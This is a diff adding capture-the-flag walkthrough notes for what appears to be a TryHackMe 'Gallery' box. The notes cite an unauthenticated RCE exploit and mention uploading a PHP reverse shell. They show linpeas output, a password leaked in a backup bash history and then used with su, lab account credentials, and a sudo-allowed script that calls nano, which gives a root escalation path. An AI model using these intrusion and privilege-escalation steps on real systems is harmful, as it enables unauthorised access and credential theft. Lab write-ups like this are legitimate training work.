@@ -91,4 +91,70 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 2024/01/17 05:05:23 Finished
 ===============================================================
+
+<h2>found Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)</h2>
+link: https://www.exploit-db.com/exploits/50214
+
+upload php reverse shell and run
+get initial access as www-data
+run linpeas as www
+
+found :
+drwx------ 3 mike mike 4096 May 20  2021 /home/mike/.gnupg
+drwxr-xr-x 3 root root 4096 May 24  2021 /var/backups/mike_home_backup/.gnupg
+-rwxr-xr-x 1 root root 103 May 24  2021 /var/backups/mike_home_backup/documents/accounts.txt
+-rwxr-xr-x 1 root root 807 May 24  2021 /var/backups/mike_home_backup/.profile
+
+
+╔══════════╣ Unexpected in /opt (usually empty)
+-rw-r--r--  1 root root  364 May 20  2021 rootkit.sh
+
+╔══════════╣ Searching passwords in history files
+/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats                                     
+/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
+/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
+/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
+/var/backups/mike_home_backup/.bash_history:sudo -l
+
+su mike
+Password: b3stpassw0rdbr0xx
+
+mike@gallery:~/documents$ cat accounts.txt
+cat accounts.txt
+Spotify : mike@gmail.com:mycat666
+Netflix : mike@gmail.com:123456789pass
+TryHackme: mike:darkhacker123
+
+run linpeas as mike
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
+Matching Defaults entries for mike on gallery:                                                                                                                                                                                              
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+
+
+cat rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+
+
+
 </code>
